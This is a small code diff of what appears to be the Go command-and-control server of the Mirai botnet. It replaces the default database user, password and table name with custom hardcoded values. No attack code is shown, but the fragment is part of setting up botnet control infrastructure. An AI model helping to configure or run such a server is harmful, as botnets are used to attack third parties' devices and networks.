@@ -8,9 +8,9 @@ import (
 )
 
 const DatabaseAddr string   = "127.0.0.1"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
-const DatabaseTable string  = "mirai"
+const DatabaseUser string   = "GLITCH_VELOPER_SUPER"
+const DatabasePass string   = "123SWARMsoe"
+const DatabaseTable string  = "mysql"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
